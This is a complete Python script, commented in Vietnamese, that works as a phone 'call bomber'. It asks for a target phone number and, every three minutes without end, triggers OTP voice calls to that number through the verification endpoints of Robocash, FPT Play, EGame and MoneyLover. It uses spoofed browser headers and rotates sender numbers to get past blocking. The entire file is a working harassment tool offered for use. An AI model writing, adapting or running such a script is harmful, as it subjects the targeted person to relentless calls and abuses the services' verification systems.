import requests
import time
import random
import concurrent.futures
from colorama import Fore, Style, init
import sys
import urllib3

init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Danh sách số điện thoại, có thể thêm số bạn muốn sử dụng
phone_numbers = [
    "0357156322",
    "0357156323",
    "0357156324",
    "0357156325"
]

# Biến để lưu trữ số điện thoại đang được sử dụng và thông tin trạng thái
current_phone_index = 0
blocked_numbers = set()
call_success_count = 0
call_fail_count = 0

def print_status():
    """In thông tin trạng thái hiện tại"""
    print(f"\n{Fore.CYAN}===== THÔNG TIN TRẠNG THÁI =====")
    print(f"{Fore.GREEN}Số đang sử dụng: {phone_numbers[current_phone_index]}")
    print(f"{Fore.GREEN}Cuộc gọi thành công: {call_success_count}")
    print(f"{Fore.RED}Cuộc gọi thất bại: {call_fail_count}")
    print(f"{Fore.YELLOW}Số bị chặn: {list(blocked_numbers)}")
    print(f"{Fore.CYAN}============================\n")

def switch_phone_number():
    """Chuyển sang số điện thoại khác chưa bị chặn"""
    global current_phone_index

    available_numbers = [i for i, num in enumerate(phone_numbers) if num not in blocked_numbers]

    if not available_numbers:
        print(f"{Fore.RED}Tất cả số điện thoại đều đã bị chặn. Dừng chương trình.")
        sys.exit(1)

    # Chọn một số khác với số hiện tại
    available_indices = [i for i in available_numbers if i != current_phone_index]
    if available_indices:
        current_phone_index = random.choice(available_indices)
    else:
        current_phone_index = available_numbers[0]

    print(f"{Fore.YELLOW}Đã chuyển sang số mới: {phone_numbers[current_phone_index]}")

def robocash_call(target_phone):
    """Thực hiện cuộc gọi qua Robocash"""
    global call_success_count, call_fail_count

    headers = {
        'Host': 'robocash.vn',
        'accept': '*/*',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://robocash.vn',
        'referer': 'https://robocash.vn/',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = {
        'phone': target_phone,
        'login_type': '2',
    }

    try:
        response = requests.post('https://robocash.vn/register/phone-resend', headers=headers, data=data, timeout=10)
        if response.status_code == 200 and "success" in response.text.lower():
            print(f"{Fore.GREEN}ROBOCASH CALL | THÀNH CÔNG | Mục tiêu: {target_phone} | Từ: {phone_numbers[current_phone_index]}")
            call_success_count += 1
            return True
        else:
            raise Exception("API không trả về thành công")
    except Exception as e:
        print(f"{Fore.RED}ROBOCASH CALL | THẤT BẠI | Mục tiêu: {target_phone} | Từ: {phone_numbers[current_phone_index]} | Lỗi: {str(e)}")
        call_fail_count += 1
        return False

def fptplay_call(target_phone):
    """Thực hiện cuộc gọi qua FPT Play"""
    global call_success_count, call_fail_count

    headers = {
        'Host': 'api.fptplay.net',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
        'content-type': 'application/json',
        'origin': 'https://fptplay.vn',
        'referer': 'https://fptplay.vn/',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    json_data = {
        'phone': target_phone,
        'country_code': 'VN',
        'client_id': 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
    }

    try:
        response = requests.post('https://api.fptplay.net/api/v7.1_w/user/otp/voice_call?st=Eim9hpobCZPoIoVVokkIDA&e=1736436123&device=Chrome(Win)&drm=1', headers=headers, json=json_data, timeout=10)
        if response.status_code == 200 and "success" in response.text.lower():
            print(f"{Fore.GREEN}FPTPLAY CALL | THÀNH CÔNG | Mục tiêu: {target_phone} | Từ: {phone_numbers[current_phone_index]}")
            call_success_count += 1
            return True
        else:
            raise Exception("API không trả về thành công")
    except Exception as e:
        print(f"{Fore.RED}FPTPLAY CALL | THẤT BẠI | Mục tiêu: {target_phone} | Từ: {phone_numbers[current_phone_index]} | Lỗi: {str(e)}")
        call_fail_count += 1
        return False

def egame_call(target_phone):
    """Thực hiện cuộc gọi qua EGame"""
    global call_success_count, call_fail_count

    headers = {
        'Host': 'egame.vn',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'x-requested-with': 'XMLHttpRequest',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://egame.vn',
        'referer': 'https://egame.vn/signup',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    data = {
        'phone': target_phone,
        'type': '3',
    }

    try:
        response = requests.post('https://egame.vn/api/auth/authentication/resend-otp', headers=headers, data=data, timeout=10)
        if response.status_code == 200 and "success" in response.text.lower():
            print(f"{Fore.GREEN}EGAME CALL | THÀNH CÔNG | Mục tiêu: {target_phone} | Từ: {phone_numbers[current_phone_index]}")
            call_success_count += 1
            return True
        else:
            raise Exception("API không trả về thành công")
    except Exception as e:
        print(f"{Fore.RED}EGAME CALL | THẤT BẠI | Mục tiêu: {target_phone} | Từ: {phone_numbers[current_phone_index]} | Lỗi: {str(e)}")
        call_fail_count += 1
        return False

def moneylover_call(target_phone):
    """Thực hiện cuộc gọi qua MoneyLover"""
    global call_success_count, call_fail_count

    headers = {
        'Host': 'app.moneylover.me',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'application/json;charset=UTF-8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
        'origin': 'https://web.moneylover.me',
        'referer': 'https://web.moneylover.me/',
        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
    }

    json_data = {
        'password': '123456789aA@',
        'phoneNumber': target_phone,
        'phoneNumberWithoutCode': target_phone[1:],
        'shortCode': '84',
        'verifyMethod': 'voice',
    }

    try:
        response = requests.post('https://app.moneylover.me/api/user/register', headers=headers, json=json_data, timeout=10)
        if response.status_code == 200:
            print(f"{Fore.GREEN}MONEYLOVER CALL | THÀNH CÔNG | Mục tiêu: {target_phone} | Từ: {phone_numbers[current_phone_index]}")
            call_success_count += 1
            return True
        else:
            raise Exception(f"Lỗi mã trạng thái: {response.status_code}")
    except Exception as e:
        print(f"{Fore.RED}MONEYLOVER CALL | THẤT BẠI | Mục tiêu: {target_phone} | Từ: {phone_numbers[current_phone_index]} | Lỗi: {str(e)}")
        call_fail_count += 1
        return False

def call_cycle(target_phone):
    """Thực hiện một chu kỳ cuộc gọi qua tất cả các dịch vụ"""
    print(f"\n{Fore.CYAN}=== BẮT ĐẦU CHU KỲ GỌI MỚI ===")
    print(f"{Fore.YELLOW}Thời gian: {time.strftime('%H:%M:%S')} - Ngày: {time.strftime('%d/%m/%Y')}")
    print(f"{Fore.YELLOW}Số mục tiêu: {target_phone}")
    print(f"{Fore.YELLOW}Số đang sử dụng: {phone_numbers[current_phone_index]}")

    # Danh sách các hàm gọi điện cần thực hiện
    call_functions = [
        robocash_call,
        fptplay_call,
        egame_call,
        moneylover_call
    ]

    # Thực hiện gọi song song
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        results = list(executor.map(lambda func: func(target_phone), call_functions))

    # Kiểm tra kết quả
    success_calls = sum(1 for r in results if r)

    # Nếu tất cả các cuộc gọi đều thất bại, có thể số đang dùng đã bị chặn
    if success_calls == 0:
        print(f"{Fore.RED}Tất cả cuộc gọi đều thất bại. Có thể số {phone_numbers[current_phone_index]} đã bị chặn.")
        blocked_numbers.add(phone_numbers[current_phone_index])
        switch_phone_number()

    print(f"{Fore.CYAN}=== KẾT THÚC CHU KỲ GỌI ===\n")
    print_status()

def main():
    """Hàm chính của chương trình"""
    target_phone = input(f"{Fore.CYAN}Nhập số điện thoại mục tiêu: ")
    print(f"{Fore.YELLOW}Số mục tiêu: {target_phone}")
    print(f"{Fore.YELLOW}Dịch vụ gọi: Robocash, FPTPlay, EGame, MoneyLover")
    print(f"{Fore.YELLOW}Chu kỳ: Mỗi 3 phút - Tự động chuyển số khi bị chặn")
    print(f"{Fore.YELLOW}Số đang sử dụng: {phone_numbers[current_phone_index]}")

    try:
        while True:
            call_cycle(target_phone)
            print(f"{Fore.CYAN}Đợi 3 phút trước khi gọi lại...")
            time.sleep(180)  # Đợi 3 phút (180 giây)
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}Chương trình đã bị dừng bởi người dùng.")
    except Exception as e:
        print(f"{Fore.RED}Lỗi không mong muốn: {str(e)}")
    finally:
        print(f"{Fore.CYAN}=== THỐNG KÊ CUỐI CÙNG ===")
        print(f"{Fore.GREEN}Tổng cuộc gọi thành công: {call_success_count}")
        print(f"{Fore.RED}Tổng cuộc gọi thất bại: {call_fail_count}")
        print(f"{Fore.YELLOW}Số bị chặn: {list(blocked_numbers)}")

if __name__ == "__main__":
    main()